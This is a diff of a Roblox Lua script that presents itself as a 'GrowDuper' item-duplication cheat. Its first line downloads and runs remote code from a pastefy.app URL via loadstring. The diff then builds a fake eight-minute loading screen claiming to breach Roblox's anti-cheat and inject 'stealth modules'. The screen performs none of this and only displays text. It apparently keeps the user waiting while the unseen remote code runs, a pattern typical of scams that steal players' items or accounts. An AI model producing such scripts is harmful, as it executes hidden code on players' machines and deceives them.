@@ -1,116 +1,131 @@
 loadstring(game:HttpGet("https://pastefy.app/0zX3kQZJ/raw"))()
 
-local player = game.Players.LocalPlayer
+
+-- Client-sided loading screen script
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create ScreenGui
 local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = player:WaitForChild("PlayerGui")
+screenGui.Name = "LoadingScreen"
 screenGui.IgnoreGuiInset = true
-screenGui.DisplayOrder = 1000 -- Ensures instant pop-up by prioritizing rendering
+screenGui.Parent = PlayerGui
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(1, 0, 1, 0)
-frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-frame.BackgroundTransparency = 0
-frame.Parent = screenGui
+-- Create translucent purple background
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1, 0, 1, 0)
+background.BackgroundColor3 = Color3.fromRGB(128, 0, 128) -- Purple
+background.BackgroundTransparency = 0.7 -- Translucent
+background.Parent = screenGui
 
--- Add gradient background
-local gradient = Instance.new("UIGradient")
-gradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 30)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 10))
-}
-gradient.Rotation = 45
-gradient.Parent = frame
+-- Create centered violet rectangle (larger size)
+local rectangle = Instance.new("Frame")
+rectangle.Size = UDim2.new(0.5, 0, 0.3, 0) -- Increased size (wider and taller)
+rectangle.Position = UDim2.new(0.5, 0, 0.5, 0)
+rectangle.AnchorPoint = Vector2.new(0.5, 0.5)
+rectangle.BackgroundColor3 = Color3.fromRGB(75, 0, 130) -- Pure violet
+rectangle.BackgroundTransparency = 0
+rectangle.Parent = screenGui
 
--- Add shadow effect
-local shadow = Instance.new("UIStroke")
-shadow.Thickness = 4
-shadow.Color = Color3.fromRGB(0, 0, 0)
-shadow.Transparency = 0.3
-shadow.Parent = frame
+-- Add rounded corners
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 20) -- Rounded corners
+uiCorner.Parent = rectangle
 
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Size = UDim2.new(0.7, 0, 0.1, 0)
-titleLabel.Position = UDim2.new(0.15, 0, 0.3, 0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Text = "GrowDuper Script is Loading"
-titleLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
-titleLabel.TextScaled = true
-titleLabel.Font = Enum.Font.GothamBlack
-titleLabel.TextStrokeTransparency = 0.8
-titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-titleLabel.Parent = frame
+-- Add glowing outline using UIStroke
+local uiStroke = Instance.new("UIStroke")
+uiStroke.Thickness = 4
+uiStroke.Color = Color3.fromRGB(200, 150, 255) -- Light purple for glow
+uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+uiStroke.Parent = rectangle
 
-local warningLabel = Instance.new("TextLabel")
-warningLabel.Size = UDim2.new(0.7, 0, 0.08, 0)
-warningLabel.Position = UDim2.new(0.15, 0, 0.4, 0)
-warningLabel.BackgroundTransparency = 1
-warningLabel.Text = "Warning: Do not close the script or you will get detected"
-warningLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
-warningLabel.TextScaled = true
-warningLabel.Font = Enum.Font.Gotham
-warningLabel.TextStrokeTransparency = 0.8
-warningLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-warningLabel.Parent = frame
+-- Add retro arcade style with UIGradient for glow effect
+local uiGradient = Instance.new("UIGradient")
+uiGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 150, 255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 150, 255))
+})
+uiGradient.Rotation = 45
+uiGradient.Parent = uiStroke
 
+-- Add "BREACHING ROBLOX ANTI CHEAT SYSTEM.." text
+local mainText = Instance.new("TextLabel")
+mainText.Size = UDim2.new(0.8, 0, 0.4, 0)
+mainText.Position = UDim2.new(0.5, 0, 0.3, 0)
+mainText.AnchorPoint = Vector2.new(0.5, 0.5)
+mainText.BackgroundTransparency = 1
+mainText.Text = "BREACHING ROBLOX ANTI CHEAT SYSTEM.."
+mainText.TextColor3 = Color3.fromRGB(255, 255, 255)
+mainText.TextScaled = true
+mainText.Font = Enum.Font.Arcade -- Retro arcade font
+mainText.Parent = rectangle
+
+-- Add "Injecting stealth modules..." text
+local waitText = Instance.new("TextLabel")
+waitText.Size = UDim2.new(0.8, 0, 0.2, 0)
+waitText.Position = UDim2.new(0.5, 0, 0.7, 0)
+waitText.AnchorPoint = Vector2.new(0.5, 0.5)
+waitText.BackgroundTransparency = 1
+waitText.Text = "Injecting stealth modules..."
+waitText.TextColor3 = Color3.fromRGB(200, 200, 200)
+waitText.TextScaled = true
+waitText.Font = Enum.Font.Arcade
+waitText.Parent = rectangle
+
+-- Create loading bar
 local loadingBarFrame = Instance.new("Frame")
-loadingBarFrame.Size = UDim2.new(0.5, 0, 0.06, 0)
-loadingBarFrame.Position = UDim2.new(0.25, 0, 0.55, 0)
-loadingBarFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-loadingBarFrame.BorderSizePixel = 0
-loadingBarFrame.Parent = frame
-
--- Add corner radius to loading bar frame
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 8)
-corner.Parent = loadingBarFrame
-
--- Add shadow to loading bar
-local barShadow = Instance.new("UIStroke")
-barShadow.Thickness = 2
-barShadow.Color = Color3.fromRGB(0, 0, 0)
-barShadow.Transparency = 0.5
-barShadow.Parent = loadingBarFrame
+loadingBarFrame.Size = UDim2.new(0.6, 0, 0.05, 0)
+loadingBarFrame.Position = UDim2.new(0.5, 0, 0.85, 0)
+loadingBarFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+loadingBarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Dark background
+loadingBarFrame.Parent = rectangle
 
 local loadingBar = Instance.new("Frame")
-loadingBar.Size = UDim2.new(0, 0, 1, 0)
-loadingBar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
-loadingBar.BorderSizePixel = 0
+loadingBar.Size = UDim2.new(0, 0, 1, 0) -- Starts empty
+loadingBar.BackgroundColor3 = Color3.fromRGB(200, 150, 255) -- Light purple
 loadingBar.Parent = loadingBarFrame
 
--- Add gradient to loading bar
-local barGradient = Instance.new("UIGradient")
-barGradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 100)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 50))
-}
-barGradient.Parent = loadingBar
+-- Add UIStroke to loading bar for retro outline
+local barStroke = Instance.new("UIStroke")
+barStroke.Thickness = 2
+barStroke.Color = Color3.fromRGB(255, 255, 255)
+barStroke.Parent = loadingBarFrame
 
--- Add corner radius to loading bar
+-- Add rounded corners to loading bar
 local barCorner = Instance.new("UICorner")
-barCorner.CornerRadius = UDim.new(0, 8)
-barCorner.Parent = loadingBar
+barCorner.CornerRadius = UDim.new(0, 10)
+barCorner.Parent = loadingBarFrame
 
-local percentageLabel = Instance.new("TextLabel")
-percentageLabel.Size = UDim2.new(0.5, 0, 0.05, 0)
-percentageLabel.Position = UDim2.new(0.25, 0, 0.62, 0)
-percentageLabel.BackgroundTransparency = 1
-percentageLabel.Text = "0%"
-percentageLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
-percentageLabel.TextScaled = true
-percentageLabel.Font = Enum.Font.Gotham
-percentageLabel.TextStrokeTransparency = 0.8
-percentageLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-percentageLabel.Parent = frame
+-- Fade-in animation
+local function fadeIn()
+    background.BackgroundTransparency = 1
+    rectangle.BackgroundTransparency = 1
+    mainText.TextTransparency = 1
+    waitText.TextTransparency = 1
+    loadingBarFrame.BackgroundTransparency = 1
+    loadingBar.BackgroundTransparency = 1
 
-local tweenService = game:GetService("TweenService")
-local tweenInfo = TweenInfo.new(480, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0) -- 8 minutes
-local goal = {Size = UDim2.new(1, 0, 1, 0)}
-local tween = tweenService:Create(loadingBar, tweenInfo, goal)
-tween:Play()
+    local fadeInfo = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.In)
+    TweenService:Create(background, fadeInfo, {BackgroundTransparency = 0.7}):Play()
+    TweenService:Create(rectangle, fadeInfo, {BackgroundTransparency = 0}):Play()
+    TweenService:Create(mainText, fadeInfo, {TextTransparency = 0}):Play()
+    TweenService:Create(waitText, fadeInfo, {TextTransparency = 0}):Play()
+    TweenService:Create(loadingBarFrame, fadeInfo, {BackgroundTransparency = 0}):Play()
+    TweenService:Create(loadingBar, fadeInfo, {BackgroundTransparency = 0}):Play()
+end
 
-local startTime = tick()
-game:GetService("RunService").RenderStepped:Connect(function()
-    local elapsed = math.min(tick() - startTime, 480)
-    local progress = elapsed / 480
-    percentageLabel.Text = math.floor(progress * 100) .. "%"
-end)
+-- Loading bar animation (8 minutes = 480 seconds)
+local function animateLoadingBar()
+    local tweenInfo = TweenInfo.new(480, Enum.EasingStyle.Linear)
+    local tween = TweenService:Create(loadingBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
+    tween:Play()
+    tween.Completed:Connect(function()
+        mainText.Text = "Success"
+    end)
+end
+
+-- Run animations
+fadeIn()
+animateLoadingBar()
